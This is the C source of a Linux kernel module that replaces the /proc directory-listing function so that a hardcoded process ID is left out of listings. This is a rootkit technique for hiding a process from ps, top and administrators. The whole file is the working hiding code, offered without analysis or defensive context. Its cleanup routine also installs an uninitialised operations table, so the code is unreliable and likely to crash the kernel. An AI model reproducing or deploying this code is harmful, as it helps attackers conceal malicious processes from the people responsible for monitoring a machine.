#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <net/sock.h>


#define HIDEPID 21178

typedef int (*readdir_t)(struct file *, struct dir_context *);


int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir);
int my_proc_readdir(struct file *fp, struct dir_context* dir_cont);
bool my_proc_filldir (
    struct dir_context* some,  const char *name, int nlen, 
    loff_t off, u64 ino, unsigned x);
int restore (readdir_t orig_readdir);
int num_from_str(const char *str);


readdir_t orig_proc_readdir=NULL;
filldir_t proc_filldir = NULL;


int init_module(void)
{
    printk(KERN_INFO "Start work\n");
    hide_pid(&orig_proc_readdir, my_proc_readdir);
    return 0;
}

struct file_operations kek;


int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir)
{
    struct file *filep;

    /*open /proc */
    if((filep = filp_open("/proc",O_RDONLY,0))==NULL)
        return -1;

    /*store proc's readdir*/
    // memcpy(&kek, filep->f_op, sizeof(struct file_operations));
    *orig_readdir = filep->f_op->iterate_shared;
    // kek.iterate_shared = new_readdir;
     
    /* set proc's readdir to new_readdir */
    filep->f_op->iterate_shared = new_readdir;
    // filep->f_op = &kek;

    filp_close(filep,0);

    return 0;
}

int my_proc_readdir(struct file *fp, struct dir_context* dir_cont)
// int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
    int r=0;
             
    proc_filldir = dir_cont->actor;
    dir_cont->actor = my_proc_filldir;
    
    /*invoke orig_proc_readdir with my_proc_filldir*/
    r=orig_proc_readdir(fp, dir_cont);
            
    return r;
}


bool my_proc_filldir (
    struct dir_context* dir_cont,  const char *name, int nlen, 
    loff_t off, u64 ino, unsigned x)
{
    printk(KERN_INFO "Hide PID\n");
    /*If name is equal to our pid, then we return 0. This way,
    our pid isn't visible*/
    if(num_from_str(name) == HIDEPID)
    {
        printk(KERN_INFO "Hide PID\n");
        return 0;
    }

    /*Otherwise, call original filldir*/
    return proc_filldir(dir_cont, name, nlen, off, ino, x);    
}


/*restore /proc's read*/
int restore (readdir_t orig_readdir)
{
    struct file *filep;
            
    /*open /proc */
    if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
        return -1;

    /*restore /proc's read*/
    kek.iterate_shared = orig_readdir;
    filep->f_op = &kek;

    filp_close(filep, 0);
    
    return 0;
}


int num_from_str(const char *str)
{
    int ret = 0, mul = 1;
    const char *ptr;

    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
            ;
    ptr--;

    while (ptr >= str) 
    {
        if (*ptr < '0' || *ptr > '9')
            break;

        ret += (*ptr - '0') * mul;
        mul *= 10;
        ptr--;   
    }

    return ret;
}


void cleanup_module(void)
{
    restore(orig_proc_readdir);
    printk(KERN_INFO "Finish work\n");
}


MODULE_LICENSE("GPL");
